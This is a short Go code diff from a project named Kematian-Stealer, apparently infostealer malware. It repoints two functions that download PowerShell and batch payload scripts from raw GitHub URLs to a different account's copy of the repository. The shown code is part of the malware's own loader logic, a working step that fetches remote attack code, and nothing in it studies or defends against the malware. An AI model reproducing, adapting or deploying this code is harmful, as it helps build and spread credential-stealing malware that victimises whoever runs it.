@@ -6,7 +6,7 @@ import (
 )
 
 func GetPowershellCode() string {
-	codeUrl := "https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1"
+	codeUrl := "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.ps1"
 
 	res, err := http.Get(codeUrl)
 	if err != nil {
@@ -24,7 +24,7 @@ func GetPowershellCode() string {
 }
 
 func GetBatCode() string {
-	codeUrl := "https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.bat"
+	codeUrl := "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
 
 	res, err := http.Get(codeUrl)
 	if err != nil {
